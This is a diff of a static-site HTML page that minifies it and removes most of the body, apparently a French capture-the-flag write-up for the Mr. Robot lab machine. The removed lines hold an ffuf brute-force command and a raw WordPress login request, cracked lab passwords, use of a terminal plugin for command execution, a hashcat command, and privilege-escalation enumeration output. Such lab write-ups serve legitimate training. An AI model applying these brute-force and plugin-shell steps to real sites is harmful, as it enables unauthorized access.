@@ -1,9 +1,4 @@
-<!DOCTYPE html>
-<html lang="fr-fr" dir="ltr">
-<head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script>
-  <meta charset="UTF-8">
-<meta name="viewport" content="width=device-width, initial-scale=1.0">
-<meta name="description" content="
+<!doctype html><html lang=fr-fr dir=ltr><head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script><meta charset=UTF-8><meta name=viewport content="width=device-width,initial-scale=1"><meta name=description content="
   Mr Robot
   
   #
@@ -16,797 +11,240 @@
   #
   
 
-La machine Mr. Robot est disponible sur plusieurs plateforme (Vulnhub, TryHackMe Root me&hellip;) . Cette machine nous demande de récupérer 3 drapeaux.
+La machine Mr. Robot est disponible sur plusieurs plateforme (Vulnhub, TryHackMe Root me&mldr;) . Cette machine nous demande de récupérer 3 drapeaux.
 
   Acces a l&rsquo;application
   
   #
   
 
-On accede à l&rsquo;application depuis le port HTTP. A partir de là l&rsquo;application se présente comme un terminal. quelques options sont disponible mais l&rsquo;application nous montre majoritairement des videos et du texte.">
-<meta name="theme-color" media="(prefers-color-scheme: light)" content="#ffffff">
-<meta name="theme-color" media="(prefers-color-scheme: dark)" content="#343a40">
-<meta name="color-scheme" content="light dark"><meta property="og:url" content="//localhost:1313/docs/writeups/vm/collapsed/mrrobot/">
-  <meta property="og:site_name" content="@camillegr">
-  <meta property="og:title" content="Mr Robot">
-  <meta property="og:description" content="Mr Robot # Reconnaissance # La machine Mr. Robot est disponible sur plusieurs plateforme (Vulnhub, TryHackMe Root me…) . Cette machine nous demande de récupérer 3 drapeaux.
-Acces a l’application # On accede à l’application depuis le port HTTP. A partir de là l’application se présente comme un terminal. quelques options sont disponible mais l’application nous montre majoritairement des videos et du texte.">
-  <meta property="og:locale" content="fr_fr">
-  <meta property="og:type" content="article">
-    <meta property="article:section" content="docs">
-<title>Mr Robot | @camillegr</title>
-<link rel="icon" href="/favicon.png" >
-<link rel="manifest" href="/manifest.json">
-<link rel="canonical" href="//localhost:1313/docs/writeups/vm/collapsed/mrrobot/">
-<link rel="stylesheet" href="/book.min.d60d65c9fd57805d29fb9d7109cb03a93c46852bac9bb8cdfec366ee739b3605.css" integrity="sha256-1g1lyf1XgF0p&#43;51xCcsDqTxGhSusm7jN/sNm7nObNgU=" crossorigin="anonymous">
-  <script defer src="/fuse.min.js"></script>
-  <script defer src="/en.search.min.3671301ee6fb1487ce7a6bab94716a2d17725b696cb95ccbf01433f0f1bb1c31.js" integrity="sha256-NnEwHub7FIfOemurlHFqLRdyW2lsuVzL8BQz8PG7HDE=" crossorigin="anonymous"></script>
-<!--
-Made with Book Theme
-https://github.com/alex-shpak/hugo-book
--->
-  
-</head>
-<body dir="ltr" class="book-kind-page book-type-docs">
-  <input type="checkbox" class="hidden toggle" id="menu-control" />
-  <input type="checkbox" class="hidden toggle" id="toc-control" />
-  <main class="container flex">
-    
-<aside class="book-menu">
-  <div class="book-menu-content">
-    
-  <nav>
-<h2 class="book-brand">
-  <a class="flex align-center" href="/"><span>@camillegr</span>
-  </a>
-</h2>
-
-
-<div class="book-search hidden">
-  <input type="text" id="book-search-input" placeholder="Search" aria-label="Search" maxlength="64" data-hotkeys="s/" />
-  <div class="book-search-spinner hidden"></div>
-  <ul id="book-search-results"></ul>
-</div>
-<script>document.querySelector(".book-search").classList.remove("hidden")</script>
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-  
-  <ul>
-    
-      
-        <li>
-          
-  
-  
-
-  
-    <input type="checkbox" id="section-ad93f8b4ee98a57a6224ee06f39153b9" class="toggle"  />
-    <label for="section-ad93f8b4ee98a57a6224ee06f39153b9" class="flex">
-      <a role="button" class="flex-auto ">Projets Personnels</a>
-    </label>
-  
-
-          
-  <ul>
-    
-      
-        <li>
-          
-  
-  
-
-  
-    <a href="/docs/projets/collapsed/tofuzz/" class="">ToFuzz</a>
-  
-
-        </li>
-      
-    
-  </ul>
-
-        </li>
-      
-    
-      
-        <li>
-          
-  
-  
-
-  
-    <input type="checkbox" id="section-72538655c7e4bb37bc80c6f43d7e4b3b" class="toggle" checked />
-    <label for="section-72538655c7e4bb37bc80c6f43d7e4b3b" class="flex">
-      <a href="/docs/writeups/" class="flex-auto ">Writeups</a>
-    </label>
-  
-
-          
-  <ul>
-    
-      
-        <li>
-          
-  
-  
-
-  
-    <input type="checkbox" id="section-14ed21d169f82c1f4e9784c42f27b9c3" class="toggle"  />
-    <label for="section-14ed21d169f82c1f4e9784c42f27b9c3" class="flex">
-      <a href="/docs/writeups/rootmepro2025/" class="flex-auto ">CTF 2025 | Root-Me Pro x DGSE</a>
-    </label>
-  
-
-          
-  <ul>
-    
-      
-        <li>
-          
-  
-  
-
-  
-    <a href="/docs/writeups/rootmepro2025/collapsed/mission1/" class="">Mission 1 - IA</a>
-  
-
-        </li>
-      
-    
-      
-        <li>
-          
-  
-  
-
-  
-    <a href="/docs/writeups/rootmepro2025/collapsed/mission2/" class="">Mission 2 - SOC</a>
-  
-
-        </li>
-      
-    
-      
-        <li>
-          
-  
-  
-
-  
-    <a href="/docs/writeups/rootmepro2025/collapsed/mission3/" class="">Mission 3 - Forensic</a>
-  
-
-        </li>
-      
-    
-      
-        <li>
-          
-  
-  
-
-  
-    <a href="/docs/writeups/rootmepro2025/collapsed/mission4/" class="">Mission 4 - Pentest</a>
-  
-
-        </li>
-      
-    
-      
-        <li>
-          
-  
-  
-
-  
-    <a href="/docs/writeups/rootmepro2025/collapsed/mission5/" class="">Mission 5 - Mobile</a>
-  
-
-        </li>
-      
-    
-      
-        <li>
-          
-  
-  
-
-  
-    <a href="/docs/writeups/rootmepro2025/collapsed/mission6/" class="">Mission 6 - OSINT</a>
-  
-
-        </li>
-      
-    
-  </ul>
-
-        </li>
-      
-    
-      
-        <li>
-          
-  
-  
-
-  
-    <input type="checkbox" id="section-661913a3e27635165633fb2069bf836f" class="toggle" checked />
-    <label for="section-661913a3e27635165633fb2069bf836f" class="flex">
-      <a href="/docs/writeups/vm/" class="flex-auto ">Virtual Machines</a>
-    </label>
-  
-
-          
-  <ul>
-    
-      
-        <li>
-          
-  
-  
-
-  
-    <a href="/docs/writeups/vm/collapsed/mrrobot/" class="active">Mr Robot</a>
-  
-
-        </li>
-      
-    
-  </ul>
-
-        </li>
-      
-    
-  </ul>
-
-        </li>
-      
-    
-      
-        <li class="book-section-flat" >
-          
-  
-  
-
-  
-    <span>Divers</span>
-  
-
-          
-  <ul>
-    
-      
-        <li>
-          
-  
-  
-
-  
-    <a href="/docs/divers/blogs/" class="">Blogs</a>
-  
-
-        </li>
-      
-    
-  </ul>
-
-        </li>
-      
-    
-  </ul>
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-</nav>
-
-
-
-
-  <script>(function(){var e=document.querySelector("aside .book-menu-content");addEventListener("beforeunload",function(){localStorage.setItem("menu.scrollTop",e.scrollTop)}),e.scrollTop=localStorage.getItem("menu.scrollTop")})()</script>
-
-
-
-  </div>
-</aside>
- 
-
-    <div class="book-page">
-      <header class="book-header">
-        
-  <div class="flex align-center justify-between">
-  <label for="menu-control">
-    <img src="/svg/menu.svg" class="book-icon" alt="Menu" />
-  </label>
-
-  <h3>Mr Robot</h3>
-
-  <label for="toc-control">
-    
-    <img src="/svg/toc.svg" class="book-icon" alt="Table of Contents" />
-    
-  </label>
-</div>
-
-
-  
-  <aside class="hidden clearfix">
-    
-  
-<nav id="TableOfContents">
-  <ul>
-    <li><a href="#reconnaissance">Reconnaissance</a></li>
-    <li><a href="#acces-a-lapplication">Acces a l&rsquo;application</a>
-      <ul>
-        <li><a href="#robotstxt">robots.txt</a></li>
-        <li><a href="#fuzzing--bruteforce">Fuzzing &amp; Bruteforce</a></li>
-      </ul>
-    </li>
-    <li><a href="#shell">Shell</a>
-      <ul>
-        <li><a href="#wordpress-plugin">Wordpress Plugin</a></li>
-        <li><a href="#utilisateur-robot">Utilisateur robot</a></li>
-        <li><a href="#hashcat">Hashcat</a></li>
-      </ul>
-    </li>
-    <li><a href="#escalade-de-privilege">Escalade de privilege</a>
-      <ul>
-        <li><a href="#enumeration-avec-les">Enumeration avec LES</a></li>
-        <li><a href="#dirtycow">Dirtycow</a></li>
-      </ul>
-    </li>
-  </ul>
-</nav>
-
-
-
-  </aside>
-  
- 
-      </header>
-
-      
-      
-  <article class="markdown book-article"><h1 id="mr-robot">
-  Mr Robot
-  
-  <a class="anchor" href="#mr-robot">#</a>
-  
-</h1>
-<p><img src="../img/mrrobot_illu.png" alt="Screenshot de l&rsquo;application" /></p>
-<h2 id="reconnaissance">
-  Reconnaissance
-  
-  <a class="anchor" href="#reconnaissance">#</a>
-  
-</h2>
-<p>La machine Mr. Robot est disponible sur plusieurs plateforme (Vulnhub, TryHackMe Root me&hellip;) . Cette machine nous demande de récupérer 3 drapeaux.</p>
-<h2 id="acces-a-lapplication">
-  Acces a l&rsquo;application
-  
-  <a class="anchor" href="#acces-a-lapplication">#</a>
-  
-</h2>
-<p>On accede à l&rsquo;application depuis le port HTTP. A partir de là l&rsquo;application se présente comme un terminal. quelques options sont disponible mais l&rsquo;application nous montre majoritairement des videos et du texte.</p>
-<p>En utilisant gobuster on s&rsquo;aperçoit également que l&rsquo;application est en fait un site wordpress.</p>
-<h3 id="robotstxt">
-  robots.txt
-  
-  <a class="anchor" href="#robotstxt">#</a>
-  
-</h3>
-<p>en fouillant un petit peu on trouve rapidement le robots.txt qui contient notre premier drapeau mais également un dictionnaire .dic.</p>
-<h3 id="fuzzing--bruteforce">
-  Fuzzing &amp; Bruteforce
-  
-  <a class="anchor" href="#fuzzing--bruteforce">#</a>
-  
-</h3>
-<p>Sur notre site wordpress, on utilise la fonctionnalité &ldquo;Mot de passe oublié&rdquo; pour essayer de trouver un utilisateur existant. En se servant des noms des personnages de la série on trouve que &ldquo;Elliot&rdquo; est utilisateur.</p>
-<p>On lance alors ffuf et on trouve le mot de passe.</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>ffuf -request login.txt -w uniquedic.dic -t <span style="color:#ae81ff">200</span> -o fuzzResult  -fl <span style="color:#ae81ff">59</span>
-</span></span></code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-http" data-lang="http"><span style="display:flex;"><span><span style="color:#a6e22e">POST</span> /wp-login.php <span style="color:#66d9ef">HTTP</span><span style="color:#f92672">/</span><span style="color:#ae81ff">1.1</span>
-</span></span><span style="display:flex;"><span>Host<span style="color:#f92672">:</span> <span style="color:#ae81ff">ctf04.root-me.org</span>
-</span></span><span style="display:flex;"><span>Content-Length<span style="color:#f92672">:</span> <span style="color:#ae81ff">106</span>
-</span></span><span style="display:flex;"><span>Referer<span style="color:#f92672">:</span> <span style="color:#ae81ff">http://ctf04.root-me.org/wp-login.php</span>
-</span></span><span style="display:flex;"><span>Accept-Encoding<span style="color:#f92672">:</span> <span style="color:#ae81ff">gzip, deflate, br</span>
-</span></span><span style="display:flex;"><span>Cookie<span style="color:#f92672">:</span> <span style="color:#ae81ff">xxxxx</span>
-</span></span><span style="display:flex;"><span>Connection<span style="color:#f92672">:</span> <span style="color:#ae81ff">keep-alive</span>
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>log=Elliot&amp;pwd=FUZZ&amp;wp-submit=Log+In&amp;redirect_to=http%3A%2F%2Fctf04.root-me.org%2Fwp-admin%2F&amp;testcookie=1%
-</span></span></code></pre></div><p><img src="../img/mrrobot_fuzzing.png" alt="fuzzing" /></p>
-<p>On obtient le mot de passe : &ldquo;ER28-0652&rdquo;.</p>
-<h2 id="shell">
-  Shell
-  
-  <a class="anchor" href="#shell">#</a>
-  
-</h2>
-<h3 id="wordpress-plugin">
-  Wordpress Plugin
-  
-  <a class="anchor" href="#wordpress-plugin">#</a>
-  
-</h3>
-<p>Il se trouve qu&rsquo;Elliot est administrateur du site wordpress. On va donc installer un plugin qui nous permettra d&rsquo;executer des commandes sur la machine. On installe donc le plugin WPTerm. Après ça on peut récupérer un terminal et lister les utilisateurs via le fichier /etc/passwd</p>
-<p><img src="../img/mrrobot_passwd.png" alt="passwd" /></p>
-<h3 id="utilisateur-robot">
-  Utilisateur robot
-  
-  <a class="anchor" href="#utilisateur-robot">#</a>
-  
-</h3>
-<p>Une fois sur le terminal, on liste les utilisateurs en vérifiant le fichier /etc/passwd. On s&rsquo;aperçoit qu&rsquo;il y a un utilisateur robot. Cet utilisateur a un fichier password.raw-md5 dans son dossier utilisateur.</p>
-<h3 id="hashcat">
-  Hashcat
-  
-  <a class="anchor" href="#hashcat">#</a>
-  
-</h3>
-<p>On utilise hashcat pour essayer de trouver le mot de passe correspondant :</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>hashcat -a <span style="color:#ae81ff">0</span> -m <span style="color:#ae81ff">0</span> hash /usr/share/wordlists/rockyou.txt
-</span></span></code></pre></div><p><img src="../img/mrrobot_hashcat.png" alt="passwd" /></p>
-<p>on trouve le mot de passe &ldquo;abcdefghijklmnopqstruvwxyz&rdquo;. dans robot on trouve egalement notre deuxième drapeau.</p>
-<h2 id="escalade-de-privilege">
-  Escalade de privilege
-  
-  <a class="anchor" href="#escalade-de-privilege">#</a>
-  
-</h2>
-<p>Après une énumération manuelle on voit qu&rsquo;il n&rsquo;y pas moyen d&rsquo;exploiter de failles de sudo ni d&rsquo;exploiter les fichiers de l&rsquo;utilisateur. On passe à une énumération automatisée.</p>
-<h3 id="enumeration-avec-les">
-  Enumeration avec LES
-  
-  <a class="anchor" href="#enumeration-avec-les">#</a>
-  
-</h3>
-<details ><summary>Enumeration LES</summary>
-  <div class="markdown-inner">
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span> ./lse.sh
-</span></span><span style="display:flex;"><span>---
-</span></span><span style="display:flex;"><span>If you know the current user password, write it here to check sudo privileges: abcdefghijklmnopqrstuvwxyz
-</span></span><span style="display:flex;"><span>---
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span> LSE Version: 4.14nw
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>        User: robot
-</span></span><span style="display:flex;"><span>     User ID: <span style="color:#ae81ff">1002</span>
-</span></span><span style="display:flex;"><span>    Password: ******
-</span></span><span style="display:flex;"><span>        Home: /home/robot
-</span></span><span style="display:flex;"><span>        Path: /usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games
-</span></span><span style="display:flex;"><span>       umask: <span style="color:#ae81ff">0002</span>
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>    Hostname: linux
-</span></span><span style="display:flex;"><span>       Linux: 3.13.0-55-generic
-</span></span><span style="display:flex;"><span>Distribution: Ubuntu 14.04.2 LTS
-</span></span><span style="display:flex;"><span>Architecture: x86_64
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span><span style="color:#f92672">=====================(</span> Current Output Verbosity Level: <span style="color:#ae81ff">0</span> <span style="color:#f92672">)======================</span>
-</span></span><span style="display:flex;"><span><span style="color:#f92672">===============================================================(</span> humanity <span style="color:#f92672">)=====</span>
-</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>!<span style="color:#f92672">]</span> nowar0 Should we question autocrats and their <span style="color:#e6db74">&#34;military operations&#34;</span>?... yes!
-</span></span><span style="display:flex;"><span>---
-</span></span><span style="display:flex;"><span>                                      NO
-</span></span><span style="display:flex;"><span>                                      WAR
-</span></span><span style="display:flex;"><span>---
-</span></span><span style="display:flex;"><span><span style="color:#f92672">==================================================================(</span> users <span style="color:#f92672">)=====</span>
-</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>i<span style="color:#f92672">]</span> usr000 Current user groups............................................. yes!
-</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> usr010 Is current user in an administrative group?..................... nope
-</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> usr020 Are there other users in administrative groups?................. yes!
-</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> usr030 Other users with shell.......................................... yes!
-</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>i<span style="color:#f92672">]</span> usr040 Environment information......................................... skip
-</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>i<span style="color:#f92672">]</span> usr050 Groups <span style="color:#66d9ef">for</span> other users.......................................... skip
-</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>i<span style="color:#f92672">]</span> usr060 Other users..................................................... skip
-</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> usr070 PATH variables defined inside /etc.............................. yes!
-</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>!<span style="color:#f92672">]</span> usr080 Is <span style="color:#e6db74">&#39;.&#39;</span> in a PATH variable defined inside /etc?.................. nope
-</span></span><span style="display:flex;"><span><span style="color:#f92672">===================================================================(</span> sudo <span style="color:#f92672">)=====</span>
-</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>!<span style="color:#f92672">]</span> sud000 Can we sudo without a password?................................. nope
-</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>!<span style="color:#f92672">]</span> sud010 Can we list sudo commands without a password?................... nope
-</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>!<span style="color:#f92672">]</span> sud020 Can we sudo with a password?.................................... nope
-</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>!<span style="color:#f92672">]</span> sud030 Can we list sudo commands with a password?...................... nope
-</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> sud040 Can we read sudoers files?...................................... nope
-</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> sud050 Do we know <span style="color:#66d9ef">if</span> any other users used sudo?........................ nope
-</span></span><span style="display:flex;"><span><span style="color:#f92672">============================================================(</span> file system <span style="color:#f92672">)=====</span>
-</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> fst000 Writable files outside user<span style="color:#e6db74">&#39;s home.............................. yes!
-</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">[*] fst010 Binaries with setuid bit........................................ yes!
-</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">[!] fst020 Uncommon setuid binaries........................................ yes!
-</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">---
-</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">/usr/local/bin/nmap
-</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">/usr/lib/vmware-tools/bin32/vmware-user-suid-wrapper
-</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">/usr/lib/vmware-tools/bin64/vmware-user-suid-wrapper
-</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">---
-</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">[!] fst030 Can we write to any setuid binary?.............................. nope
-</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">[*] fst040 Binaries with setgid bit........................................ skip
-</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">[!] fst050 Uncommon setgid binaries........................................ skip
-</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">[!] fst060 Can we write to any setgid binary?.............................. skip
-</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">[*] fst070 Can we read /root?.............................................. nope
-</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">[*] fst080 Can we read subdirectories under /home?......................... nope
-</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">[*] fst090 SSH files in home directories................................... nope
-</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">[*] fst100 Useful binaries................................................. yes!
-</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">[*] fst110 Other interesting files in home directories..................... nope
-</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">[!] fst120 Are there any credentials in fstab/mtab?........................ nope
-</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">[*] fst130 Does &#39;</span>robot<span style="color:#e6db74">&#39; have mail?......................................... nope
-</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">[!] fst140 Can we access other users mail?................................. nope
-</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">[*] fst150 Looking for GIT/SVN repositories................................ yes!
-</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">[!] fst160 Can we write to critical files?................................. nope
-</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">[!] fst170 Can we write to critical directories?........................... nope
-</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">[!] fst180 Can we write to directories from PATH defined in /etc?.......... nope
-</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">[!] fst190 Can we read any backup?......................................... nope
-</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">[!] fst200 Are there possible credentials in any shell history file?....... nope
-</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">[!] fst210 Are there NFS exports with &#39;</span>no_root_squash<span style="color:#e6db74">&#39; option?............. nope
-</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">[*] fst220 Are there NFS exports with &#39;</span>no_all_squash<span style="color:#e6db74">&#39; option?.............. nope
-</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">[i] fst500 Files owned by user &#39;</span>robot<span style="color:#e6db74">&#39;..................................... skip
-</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">[i] fst510 SSH files anywhere.............................................. skip
-</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">[i] fst520 Check hosts.equiv file and its contents......................... skip
-</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">[i] fst530 List NFS server shares.......................................... skip
-</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">[i] fst540 Dump fstab file................................................. skip
-</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">=================================================================( system )=====
-</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">[i] sys000 Who is logged in................................................ skip
-</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">[i] sys010 Last logged in users............................................ skip
-</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">[!] sys020 Does the /etc/passwd have hashes?............................... nope
-</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">[!] sys022 Does the /etc/group have hashes?................................ nope
-</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">[!] sys030 Can we read shadow files?....................................... nope
-</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">[*] sys040 Check for other superuser accounts.............................. nope
-</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">[*] sys050 Can root user log in via SSH?................................... yes!
-</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">[i] sys060 List available shells........................................... skip
-</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">[i] sys070 System umask in /etc/login.defs................................. skip
-</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">[i] sys080 System password policies in /etc/login.defs..................... skip
-</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">===============================================================( security )=====
-</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">[*] sec000 Is SELinux present?............................................. nope
-</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">[*] sec010 List files with capabilities.................................... nope
-</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">[!] sec020 Can we write to a binary with caps?............................. nope
-</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">[!] sec030 Do we have all caps in any binary?.............................. nope
-</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">[*] sec040 Users with associated capabilities.............................. nope
-</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">[!] sec050 Does current user have capabilities?............................ skip
-</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">[!] sec060 Can we read the auditd log?..................................... nope
-</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">========================================================( recurrent tasks )=====
-</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">[*] ret000 User crontab.................................................... nope
-</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">[!] ret010 Cron tasks writable by user..................................... nope
-</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">[*] ret020 Cron jobs....................................................... yes!
-</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">[*] ret030 Can we read user crontabs....................................... nope
-</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">[*] ret040 Can we list other user cron tasks?.............................. nope
-</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">[*] ret050 Can we write to any paths present in cron jobs.................. nope
-</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">[!] ret060 Can we write to executable paths present in cron jobs........... skip
-</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">[i] ret400 Cron files...................................................... skip
-</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">[*] ret500 User systemd timers............................................. nope
-</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">[!] ret510 Can we write in any system timer?............................... nope
-</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">[i] ret900 Systemd timers.................................................. skip
-</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">================================================================( network )=====
-</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">[*] net000 Services listening only on localhost............................ yes!
-</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">[!] net010 Can we sniff traffic with tcpdump?.............................. nope
-</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">[i] net500 NIC and IP information.......................................... skip
-</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">[i] net510 Routing table................................................... skip
-</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">[i] net520 ARP table....................................................... skip
-</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">[i] net530 Nameservers..................................................... skip
-</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">[i] net540 Systemd Nameservers............................................. skip
-</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">[i] net550 Listening TCP................................................... skip
-</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">[i] net560 Listening UDP................................................... skip
-</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">===============================================================( services )=====
-</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">[!] srv000 Can we write in service files?.................................. nope
-</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">[!] srv010 Can we write in binaries executed by services?.................. nope
-</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">[*] srv020 Files in /etc/init.d/ not belonging to root..................... nope
-</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">[*] srv030 Files in /etc/rc.d/init.d not belonging to root................. nope
-</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">[*] srv040 Upstart files not belonging to root............................. nope
-</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">[*] srv050 Files in /usr/local/etc/rc.d not belonging to root.............. nope
-</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">[i] srv400 Contents of /etc/inetd.conf..................................... skip
-</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">[i] srv410 Contents of /etc/xinetd.conf.................................... skip
-</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">[i] srv420 List /etc/xinetd.d if used...................................... skip
-</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">[i] srv430 List /etc/init.d/ permissions................................... skip
-</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">[i] srv440 List /etc/rc.d/init.d permissions............................... skip
-</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">[i] srv450 List /usr/local/etc/rc.d permissions............................ skip
-</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">[i] srv460 List /etc/init/ permissions..................................... skip
-</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">[!] srv500 Can we write in systemd service files?.......................... nope
-</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">[!] srv510 Can we write in binaries executed by systemd services?.......... nope
-</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">[*] srv520 Systemd files not belonging to root............................. nope
-</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">[i] srv900 Systemd config files permissions................................ skip
-</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">===============================================================( software )=====
-</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">[!] sof000 Can we connect to MySQL with root/root credentials?............. nope
-</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">[!] sof010 Can we connect to MySQL as root without password?............... nope
-</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">[!] sof015 Are there credentials in mysql_history file?.................... nope
-</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">[!] sof020 Can we connect to PostgreSQL template0 as postgres and no pass?. nope
-</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">[!] sof020 Can we connect to PostgreSQL template1 as postgres and no pass?. nope
-</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">[!] sof020 Can we connect to PostgreSQL template0 as psql and no pass?..... nope
-</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">[!] sof020 Can we connect to PostgreSQL template1 as psql and no pass?..... nope
-</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">[*] sof030 Installed apache modules........................................ nope
